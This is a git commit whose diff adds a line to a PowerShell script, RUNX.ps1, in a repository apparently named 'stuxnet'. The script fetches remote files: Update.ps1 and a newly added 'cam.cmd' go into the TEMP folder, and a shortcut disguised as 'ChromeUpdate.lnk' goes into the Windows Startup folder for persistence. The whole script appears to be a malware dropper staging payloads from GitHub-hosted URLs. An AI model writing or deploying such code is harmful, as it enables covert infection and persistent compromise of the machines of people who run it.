bb07c89bf5c6d9e5c28a7a278c441a2d129e3042
Gaxi261 <127938084+Gaxi261@users.noreply.github.com>
2025-03-23 22:44:27 +1100

    Update RUNX.ps1

--- RUNX.ps1
+++ RUNX.ps1
@@ -1,6 +1,9 @@
 $url6 = "https://raw.githubusercontent.com/Gaxi261/stuxnet/refs/heads/main/Update.ps1"
 $output6 = "$env:TEMP\Update.ps1"
 Invoke-WebRequest -Uri $url6 -OutFile $output6
+$url9 = "https://raw.githubusercontent.com/Gaxi261/stuxnet/refs/heads/main/cam.cmd"
+$output9 = "$env:TEMP\cam.cmd"
+Invoke-WebRequest -Uri $url9 -OutFile $output9
 $url8 = "https://raw.githubusercontent.com/cia168168/folder/main/ChromeUpdate.lnk"
 $output8 = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\ChromeUpdate.lnk"
 Invoke-WebRequest -Uri $url8 -OutFile $output8
